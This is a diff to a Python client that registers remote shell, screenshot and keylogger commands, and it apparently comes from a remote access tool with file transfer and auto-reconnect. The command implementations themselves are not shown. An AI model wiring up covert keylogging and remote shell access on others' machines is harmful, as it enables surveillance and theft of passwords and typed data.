@@ -3,7 +3,9 @@
 import json
 import logging
 import queue
+import select
 import socket
+import sys
 import threading
 import time
 from typing import Any, Dict, Optional
@@ -15,10 +17,13 @@ from common.constants import (
     DOWNLOAD_ACTION,
     HANDSHAKE_ACTION,
     HELP_ACTION,
+    KEYLOGGER_ACTION,
     MAX_RETRIES,
     RETRY_BACKOFF_FACTOR,
     RETRY_DELAY,
     RETRY_DELAY_MAX,
+    SCREENSHOT_ACTION,
+    SHELL_ACTION,
     SOCKET_TIMEOUT_SEC,
     TEST_ACTION,
     UPLOAD_ACTION,
@@ -26,6 +31,9 @@ from common.constants import (
 from client.commands.help import HelpCommand
 from client.commands.download import DownloadCommand
 from client.commands.upload import UploadCommand
+from client.commands.shell import ShellCommand
+from client.commands.screenshot import ScreenshotCommand
+from client.commands.keylogger import KeyloggerCommand
 from common.protocol import (
     build_command,
     build_handshake_command,
@@ -62,6 +70,9 @@ class Client:
             HELP_ACTION: HelpCommand(),
             DOWNLOAD_ACTION: DownloadCommand(),
             UPLOAD_ACTION: UploadCommand(),
+            SHELL_ACTION: ShellCommand(),
+            SCREENSHOT_ACTION: ScreenshotCommand(),
+            KEYLOGGER_ACTION: KeyloggerCommand(),
         }
         self._retry_count = 0
         self._shutdown = False
@@ -277,14 +288,27 @@ class Client:
     def _input_loop(self) -> None:
         while self.connected:
             try:
-                line = input("client> ").strip()
-            except EOFError:
+                print("client> ", end="", flush=True)
+                
+                while self.connected:
+                    if select.select([sys.stdin], [], [], 0.1)[0]:
+                        break
+                
+                if not self.connected:
+                    break
+                    
+                line = sys.stdin.readline()
+                if not line:
+                    break
+                line = line.strip()
+            except (EOFError, KeyboardInterrupt):
                 break
             if not line:
                 continue
             if line == "test":
                 self._send_test_command()
             elif line in ("quit", "exit"):
+                self.shutdown()
                 break
             else:
                 logger.warning(f"Unknown input: {line}")
@@ -306,6 +330,10 @@ class Client:
         finally:
             self.disconnect()
             recv_thread.join(timeout=2.0)
+        
+        # If we exited input loop due to disconnect (not user quit), raise to trigger retry
+        if not self._shutdown and not self.connected:
+            raise ConnectionError("Connection lost")
 
     def disconnect(self) -> None:
         self.connected = False
